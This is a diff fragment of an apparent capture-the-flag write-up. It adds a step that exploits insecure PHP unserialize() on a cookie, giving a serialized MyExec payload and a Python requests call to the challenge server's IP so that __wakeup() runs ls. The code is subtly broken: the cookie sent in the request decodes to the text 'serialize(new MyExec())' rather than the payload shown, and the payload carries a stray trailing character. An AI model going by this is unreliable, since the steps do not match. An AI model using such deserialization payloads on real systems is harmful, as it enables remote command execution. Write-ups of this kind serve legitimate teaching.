@@ -51,7 +51,7 @@ class MyExec {
 print urlencode(base64_encode(serialize(new MyExec())));
 ?>
 ```
-
+We now have our cookie injection `Tzo2OiJNeUV4ZWMiOjE6e3M6NzoiY29tbWFuZCI7czoyOiJscyI7fQ%3D%3D1`, we can use it with the python requests library or just send it using a browser extension `requests.get('http://35.225.49.73/wantmorebiscuits/src/', cookies={'userCookie': 'c2VyaWFsaXplKG5ldyBNeUV4ZWMoKSkK'})`
 At runtime `$u = unserialize(base64_decode($_COOKIE[$cookie_name]));` will become `$u = unserialize(serialize(new MyExec()));` and the `__wakeup()` method will trigger, executing ls.
 
 ![Imgur](https://i.imgur.com/5Fo17hN.png)
